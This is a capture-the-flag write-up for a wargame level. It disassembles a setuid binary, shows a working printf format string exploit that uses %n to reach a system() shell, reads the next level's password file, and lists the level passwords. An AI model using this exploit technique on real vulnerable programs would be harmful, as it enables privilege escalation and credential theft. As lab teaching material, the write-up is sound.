# Level2 -

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|        |                                                                    |
| ------ | ------------------------------------------------------------------ |
| level3 | `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02` |
| level4 | `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`                                                                 |

## Steps to resolve on VM

Note: We will use `gdb-peda`. You can setup peda with the script: [scripts/installPeda.sh](../../scripts/installPeda.sh)

1. Connect to `level3` user

```shell
ssh level3@$SNOW_HOST -p 4242
# Enter the password

ls -l
> -rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
```

Notice there is a binary with level3 setuid and setgid.

2. Debug level3

Execute level3

```shell
./level3
(stdin) abcdef
> abcdef
```

Seems to be like level3

Lets debug the binary

```shell
(gdb) info functions

> (...)
  0x080484a4  v                                                                                                                           │id
  0x0804851a  main
  (...)
```

```shell
gdb-peda$ pdisas main
  0x0804851a <+0>:     push   %ebp
  0x0804851b <+1>:     mov    %esp,%ebp
  0x0804851d <+3>:     and    $0xfffffff0,%esp
  0x08048520 <+6>:     call   0x80484a4 <v>
  0x08048525 <+11>:    leave
  0x08048526 <+12>:    ret

gdb-peda$ pdisas v
  0x080484a4 <+0>:     push   %ebp
  0x080484a5 <+1>:     mov    %esp,%ebp
  0x080484a7 <+3>:     sub    $0x218,%esp
  0x080484ad <+9>:     mov    0x8049860,%eax
  0x080484b2 <+14>:    mov    %eax,0x8(%esp)
  0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
  0x080484be <+26>:    lea    -0x208(%ebp),%eax
  0x080484c4 <+32>:    mov    %eax,(%esp)
  0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
  0x080484cc <+40>:    lea    -0x208(%ebp),%eax
  0x080484d2 <+46>:    mov    %eax,(%esp)
  0x080484d5 <+49>:    call   0x8048390 <printf@plt>
  0x080484da <+54>:    mov    0x804988c,%eax
  0x080484df <+59>:    cmp    $0x40,%eax
  0x080484e2 <+62>:    jne    0x8048518 <v+116>
  0x080484e4 <+64>:    mov    0x8049880,%eax
  0x080484e9 <+69>:    mov    %eax,%edx
  0x080484eb <+71>:    mov    $0x8048600,%eax
  0x080484f0 <+76>:    mov    %edx,0xc(%esp)
  0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
  0x080484fc <+88>:    movl   $0x1,0x4(%esp)
  0x08048504 <+96>:    mov    %eax,(%esp)
  0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
  0x0804850c <+104>:   movl   $0x804860d,(%esp)
  0x08048513 <+111>:   call   0x80483c0 <system@plt>
  0x08048518 <+116>:   leave
  0x08048519 <+117>:   ret
```

We can see the `fgets` function. Unlike `gets`, `fgets` has an overflow protection due to a limitation on input size. We need to look elsewhere for our exploit...

By looking the next lines, we see `printf` function and his return stored in `%eax` register, which is compared.

```shell
[...]
  0x080484d5 <+49>:    call   0x8048390 <printf@plt>
  0x080484da <+54>:    mov    0x804988c,%eax
  0x080484df <+59>:    cmp    $0x40,%eax
  0x080484e2 <+62>:    jne    0x8048518 <v+116>
[...]
```

Indeed, if the returned value is equal to 0x40, then we can continue the program until we meet our `system` call, which calls a subshell

```shell
gdb-peda$ b *v+54
> Breakpoint 1 at 0x80484da

gdb-peda$ run
> # enter input

gdb-peda$ p $eax
$1 = 0x0

gdb-peda$ set $eax=0x40

gdb-peda$ continue
> Wait what?!
> [New process 4555]
> process 4555 is executing new program: /bin/dash
```

Now we need to find how to give the right format to `printf` so that he returns 0x40

After some research, we found that we can exploit `printf` format. We can do some tests and make it print the adresses on the stack with `%x` and find its place on the stack like above : 

![alt text](https://axcheron.github.io/images/2018-04-22-exploit-101-format-strings/error_printf.svg)

```shell
level3@RainFall:/tmp$ ~/level3
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x # input here
> AAAA00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e.30252e78.252e7838.2e783830
```
Here we needed to find the pointer to "AAAA", our input.  
The `%x` specifiers is stored in buffer and interpreted by the `printf()` function resulting in reading data from the stack. For each `%x`, `printf()` will fetch a number from the stack, treat this number as an address, and print out the memory contents pointed by this address as a string.  
We can see that our string ("A" = 41) is the 4th argument on the stack.

We can use the `%n` specifier : it will write the size of our input at the address pointed by `%n`. For example, the following input : AAAA%n, means that we will write the value 4 (because the size of “AAAA” equals 4) at the address pointed by `%n`.

In our case we are going to point in on the 4th argument so `%4$n`. As there is no arguments given in printf, `%n` will read the 4 octets that it points in. We are pointing it to the beginning of our string which the 4 first octets are `41414141` which means writing 4 (size of "AAAA") in the adress `0x41414141`.

However, we don't want to write 4 at the adress pointed by "AAAA" (which is 0x41414141) but 64 at the adress that will be compared.

```shell
   0x80484d5 <v+49>:    call   0x8048390 <printf@plt>
=> 0x80484da <v+54>:    mov    eax,ds:0x804988c
   0x80484df <v+59>:    cmp    eax,0x40
```

The adress we want is `0x804988c` which is `\x8c\x98\x04\x08` in shellcode in little endian
His size in the string is 4, we need to add 60 : we will do it by adding padding of 60 in the `%n` specifier

```shell
python -c 'print "\x8c\x98\x04\x08%60x%4$n"' > /tmp/exploit

cat /tmp/exploit - | ./level3 
> �                                                         200
> Wait what?!

> whoami
> > level4

> cat /home/user/level4/.pass
> > b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## Sources

### Buffer overflow

- [Memory segmentation - Cheat sheet](https://www.0x0ff.info/wp-content/uploads/2015/12/buffer-overflow-memory-segmentation-cheat-sheet.png)
- [gets vs fgets](https://iq.opengenus.org/gets-vs-fgets-in-c/#:~:text=depends%20on%20system-,gets()%20keeps%20reading%20input%20until%20newline%20character%20or%20end,of%20input%20characters%20is%20reached.)

### Shellcode

- []()

### C

- []()

### Shell

- []()
